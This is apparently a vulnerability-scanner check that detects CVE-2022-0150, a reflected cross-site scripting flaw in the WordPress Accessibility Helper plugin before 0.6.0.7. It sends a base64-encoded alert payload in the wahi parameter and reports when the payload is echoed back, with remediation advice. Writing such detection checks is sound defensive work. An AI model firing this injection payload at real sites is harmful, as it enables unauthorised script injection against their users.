metadata:
	language: v1-beta
	name: "CVE-2022-0150 WordPress Accessibility Helper <0.6.0.7 - Cross-Site Scripting"
	author: "Parimal Shaw"
	description: "Check for CVE-2022-0150."
	tags: "CVE-2022-0150"

define:
    potential_path = "/?wahi=JzthbGVydChkb2N1bWVudC5kb21haW4pOy8v"

given host then
    send request called check:
		method: "GET"
		path: {potential_path}
		
			if {check.response.status_code} is "200" and "var wah_target_src = '';alert(document.domain);//';" in {check.response.body} and "text/html" in {check.response.headers} then
					report issue:
						severity: medium
						confidence: certain
						detail: "WordPress Accessibility Helper plugin before 0.6.0.7 contains a cross-site scripting vulnerability. It does not sanitize and escape the wahi parameter before outputting back its base64 decode value in the page."
						remediation: "Upgrade to Latest Version or validate all the input data, make sure that only the allowlisted data is allowed, and ensure that all variable output in a page is encoded before it is returned to the user."
			end if